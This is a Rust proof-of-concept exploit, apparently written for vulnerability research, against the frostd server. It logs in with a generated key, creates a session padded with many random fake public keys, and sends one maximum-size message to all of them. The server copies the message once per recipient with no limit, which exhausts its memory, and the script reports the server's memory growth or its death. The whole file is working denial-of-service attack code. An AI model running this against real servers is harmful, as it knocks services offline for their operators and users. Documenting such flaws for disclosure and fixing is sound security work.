//! PoC #1 — frostd memory exhaustion via unbounded fan-out in `send`.
//!
//! Usage: poc1_dos <base_url> <server_pid> <num_recipients> <msg_bytes>
//!
//! Steps: challenge -> login (xed25519) -> create_new_session with N fake
//! pubkeys -> send N recipients x msg_bytes -> report server RSS before/after.
//! The server code (functions.rs:196-237) checks only msg.len() <= 65535 and
//! clones the full message once per recipient with NO bound on recipients.

use frost_client::api::*;
use xeddsa::Sign as _;

fn rss_kb(pid: u32) -> Option<u64> {
    let status = std::fs::read_to_string(format!("/proc/{}/status", pid)).ok()?;
    for line in status.lines() {
        if let Some(rest) = line.strip_prefix("VmRSS:") {
            return rest.split_whitespace().next()?.parse().ok();
        }
    }
    None
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();
    let base = args[1].clone();
    let pid: u32 = args[2].parse()?;
    let n: usize = args[3].parse()?;
    let msg_size: usize = args[4].parse()?;
    assert!(msg_size <= MAX_MSG_SIZE, "msg must fit server limit");

    let client = reqwest::Client::new();

    // --- Login ---------------------------------------------------------------
    let kp = snow::Builder::new(
        "Noise_K_25519_ChaChaPoly_BLAKE2s"
            .parse()
            .expect("pattern"),
    )
    .generate_keypair()
    .expect("keypair");
    let privkey: [u8; 32] = kp.private.as_slice().try_into().expect("32 bytes");
    let pubkey = PublicKey(kp.public.clone());

    let ch: ChallengeOutput = client
        .post(format!("{base}/challenge"))
        .json(&serde_json::json!({}))
        .send()
        .await?
        .error_for_status()?
        .json()
        .await?;
    let mut rng = rand::thread_rng();
    let sig: [u8; 64] = xeddsa::xed25519::PrivateKey(privkey).sign(ch.challenge.as_bytes(), &mut rng);
    let login: LoginOutput = client
        .post(format!("{base}/login"))
        .json(&LoginArgs {
            challenge: ch.challenge,
            pubkey: pubkey.clone(),
            signature: sig.to_vec(),
        })
        .send()
        .await?
        .error_for_status()?
        .json()
        .await?;
    let token = login.access_token.to_string();
    println!("logged in, token acquired");

    // --- Session with N fake pubkeys -----------------------------------------
    let mut pubkeys = vec![pubkey];
    for _ in 0..n {
        let mut b = [0u8; 32];
        rand::RngCore::fill_bytes(&mut rng, &mut b);
        pubkeys.push(PublicKey(b.to_vec()));
    }
    let sess: CreateNewSessionOutput = client
        .post(format!("{base}/create_new_session"))
        .bearer_auth(&token)
        .json(&CreateNewSessionArgs {
            pubkeys: pubkeys.clone(),
            message_count: 10,
        })
        .send()
        .await?
        .error_for_status()?
        .json()
        .await?;
    println!("session {} created with {} pubkeys", sess.session_id, n + 1);

    let before = rss_kb(pid);
    println!("server RSS before send: {:?}", before.map(|k| format!("{} kB", k)));

    // --- The attack: one send, N recipients ----------------------------------
    let msg = vec![0x41u8; msg_size];
    let t0 = std::time::Instant::now();
    let resp = client
        .post(format!("{base}/send"))
        .bearer_auth(&token)
        .json(&SendArgs {
            session_id: sess.session_id,
            recipients: pubkeys[1..].to_vec(),
            msg,
        })
        .send()
        .await?;
    let dt = t0.elapsed();
    println!("send status: {} (took {:?})", resp.status(), dt);
    let body = resp.text().await?;
    println!("send body (truncated): {}", &body[..body.len().min(200)]);

    tokio::time::sleep(std::time::Duration::from_millis(800)).await;
    let after = rss_kb(pid);
    println!("server RSS after send:  {:?}", after.map(|k| format!("{} kB", k)));
    match (before, after) {
        (Some(b), Some(a)) => {
            let growth_mb = (a as i64 - b as i64) as f64 / 1024.0;
            let expected_mb = (n as f64 * msg_size as f64) / (1024.0 * 1024.0);
            println!(
                "RSS growth: {:.1} MB | expected payload: {:.1} MB ({} recipients x {} B)",
                growth_mb, expected_mb, n, msg_size
            );
        }
        _ => println!("(server process gone — likely OOM/abort killed)"),
    }
    Ok(())
}
